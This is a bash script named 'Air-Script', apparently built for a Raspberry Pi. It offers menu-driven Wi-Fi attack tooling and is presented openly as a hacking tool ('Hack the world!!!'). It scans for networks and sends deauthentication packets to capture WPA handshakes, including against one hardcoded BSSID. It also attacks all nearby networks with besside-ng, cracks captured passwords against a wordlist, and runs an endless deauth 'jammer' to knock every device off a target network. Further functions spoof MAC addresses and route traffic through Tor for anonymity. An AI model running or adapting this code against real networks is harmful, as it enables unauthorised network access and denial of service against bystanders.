#!/bin/bash

clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####

checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
apt-get install -y aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Check if wlan0 is enabled or not #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}wlan0${White}] Enabled!"
fi
}

banner () {        ##### Banner #####
echo -e "${Red}
 ▄▄▄       ██▓ ██▀███                            
▒████▄    ▓██▒▓██ ▒ ██▒                          
▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒                          
░██▄▄▄▄██ ░██░▒██▀▀█▄                            
 ▓█   ▓██▒░██░░██▓ ▒██▒                          
 ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░                          
  ▒   ▒▒ ░ ▒ ░  ░▒ ░ ▒░                          
  ░   ▒    ▒ ░  ░░   ░                           
      ░  ░ ░     ░                               
                                                 
  ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ 
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░   
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░    
░  ░  ░  ░          ░░   ░  ▒ ░░░         ░      
      ░  ░ ░         ░      ░                    
         ░                                  "
echo -e "${Yellow} \n             Hack the world!!!
      By using this you agree to the EULA."
echo -e "${Green}\n                    Developed by: Liam Bendix"
echo -e "${Green}                         Version: 1.0.2 Stable"
}

menu () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack Wifi"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Decrypt Passowrd(s)"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifi Jammer"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change IP Address"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}View log file"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Extra Tools"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Help"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
     wifiHacking
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Passowrd(s).."
     crack
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
     wifiJammer
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
     macChange
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
     anonsurf
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
     log
     exit 0
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
     tools
     exit 0
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
     Help
     exit 0
     ;;
  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}

wifiHacking () {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Air-Script Attacks"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Fluxion Attacks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifite Attacks"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifite2 Attacks"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Air Script Attacks.."
     AirScriptMenu
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
     FluxionMenu
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 2 Wifite.."
     Wifite
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 2 Wifite2.."
     Wifite2
     exit 0
     ;;
  5) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


 AirScriptMenu() {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Network.."
     AirScript
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
     attackAll
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Crack Password.."
     crack
     exit 0
     ;;
  4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}



AirScript() {
./raspberry.sh
monitor
#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 9 --output-format pcap --write handshake wlan0mon > /dev/null &
echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
#sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
sudo chmod -R 755 air-crack
sudo airmon-ng stop wlan0mon
sudo ifconfig wlan0 up
sudo systemctl start NetworkManager
echo -e "[${Green}Status${White}] Done! Select 3 to crack captured passowrd or select 4 to exit.."
}


attackAll() {
./raspberry2.sh
sudo airmon-ng check kill
sudo airmon-ng
sudo airmon-ng start wlan0
sudo besside-ng wlam0mon
sudo airmon-ng stop wlan0mon
sudo ifconfig wlan0 up
sudo systemctl start NetworkManager
sudo chmod -R 755 air-crack
echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
}


FluxionMenu() {
cd tools
cd fluxion
sudo ./fluxion.sh
}

Wifite () {
sudo wifite
}

Wifite2 () {
cd tools
cd wifite2
sudo ./Wifite.py
}

crack() {
chmod -R 755 air-script
sudo aircrack-ng -w wordlist.txt wep.cap
sudo aircrack-ng -w wordlist.txt wpa.cap
sudo aircrack-ng -a2 -w wordlist.txt *.cap
sudo aircrack-ng -w wordlist.txt *.cap
}



wifiJammer () {        ##### Sending unlimited DeAuth #####
monitor
airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
}

monitor () {        ##### Monitor mode, scan available networks & select target #####
spinner &
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv 2> /dev/null" EXIT 
airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
sed -i '1d' generated-01.kismet.csv
kill %1
airmon-ng stop wlan0mon
echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
targetNumber=1000
while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
read -p "└─────►$(tput setaf 7) " targetNumber
done
airmon-ng start wlan0
targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
rm generated-01.kismet.csv 2> /dev/null
echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
}

macChange() {
     ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Restore Original MAC Address"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Show Current MAC Address"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Changing MAC Address..."
     spoofMAC
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Restore MAC Address.."
     RestoreMAC
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Current MAC Address.."
     showMAC
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


spoofMAC(){
macchanger -s eth0
macchanger -s wlan0
sudo ifconfig eth0 down
sudo ifconfig wlan0 down
sudo macchanger -r eth0
sudo macchanger -r wlan0
sudo ifconfig eth0 up
sudo ifconfig wlan0 up
macchanger -s eth0
macchanger -s wlan0
}

RestoreMAC(){
sudo ifconfig eth0 down
sudo ifconfig wlan0 down
sudo macchanger -p eth0
sudo macchanger -p wlan0
sudo ifconfig eth0 up
sudo ifconfig wlan0 up
sudo macchanger -s eth0
sudo macchanger -s wlan0

}

showMAC() {
macchanger -s eth0
macchanger -s wlan0



}





anonsurf (){ 
       ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Start Anonsurf"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Show Anonsurf Status"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Stop Anonsurf"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Restart Anonsurf"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change TOR Identity"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Start i2p Services"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Stop i2p Services"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Show Current IP Address"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
     anonsurfStart
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
     anonsurfStatus
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
     anonsurfStop
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
     anonsurfRestart
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
     anonsurfChange
     exit 0
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
     anonsurfStarti2p
     exit 0
     ;; 
  7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
     anonsurfStopi2p
     exit 0
     ;; 
  8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
     anonip
     exit 0
     ;; 
  9) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


anonsurfStart(){
sudo anonsurf start
}

anonsurfStatus(){
sudo anonsurf status
}


anonsurfStop(){
sudo anonsurf stop
}

anonsurfRestart(){
sudo anonsurf restart
}

anonsurfChange(){
sudo anonsurf change
}

anonsurfStarti2p(){
sudo anonsurf starti2p
}
anonsurfStopi2p(){
sudo anonsurf stopi2p
}

anonip(){
sudo anonsurf myip
}




      tools () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Zirikatu"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Zirikaru"
  zirikatu
     ;;
  2) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


zirikatu () {
cd tools
cd zirikatu
sudo ./zirikatu.sh

}



Help()
{        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}How to set up for mobile"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Its not working :("
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Turn off monitor mode"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Uninstall"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] How to set up mobile?"
     instructions
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
     fix
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Fixing monitor mode.."
     stopMon
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Running uninstall tool.."
    uninstall
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}

uninstall () {
sudo ./uninstall.sh 
}

stopMon () {
sudo airmon-ng stop wlan0mon
sudo service network-mamager start
sudo service network-mamager restart
sudo ifconfig wlan0 up
sudo wpa_suplicant

}




instructions(){

echo "$(tput setaf 2)INSTRUCTIONS:

METHOD 1: (SSH/AD HOC METHOD)

Step 1: Once established connection to Pi via Hotspot or Ad Hoc
run command "sudo ./air-script.sh"
Step 2: Select an attack
--------------------------------------------------

METHOD 2:

With Raspberry Pi using screen, mouse and keyboard:
You can use method one, without the need of SSH or Ad Hoc. "
}

fix(){
echo "$(tput setaf 2)Attempting to fix! Please wait..."
cd /home/superuser/air-script/tools
apt-get update
##################### aircrack-ng ##################### 
apt-get install -y aircrack-ng
##################### macchanger ##################### 
apt-get install -y macchanger
##################### anonsurf ##################### 
git clone https://github.com/Und3rf10w/kali-anonsurf
chmod -R 755 kali-anonsurf
cd kali-anonsurf
./installer.sh
apt install ./kali-anonsurf.deb
###################### Wifite2 ####################
cd ..
git clone https://github.com/derv82/wifite2.git
cd wifite2
cd ..
echo "$(tput setaf 2)Press Ctrl + C when fluxion is done."
##################### Fluxion ##################### 
git clone https://www.github.com/FluxionNetwork/fluxion.git
chmod -R 755 fluxion
cd fluxion
sudo ./fluxion.sh -i
cd ..
############### Zirikatu #########################
git clone https://github.com/pasahitz/zirikatu
chmod -R 755 zirikatu
echo "$(tput setaf 2)Done!"


}



log(){
cat besside.log
}

spinner() {        ##### Animation while scanning for available networks #####
sleep 2
echo -e "[${Green}wlan0mon${White}] Preparing for scan..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}wlan0mon${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
done
}

targeted () {
checkDependencies
checkWiFiStatus
banner
menu
}

targeted
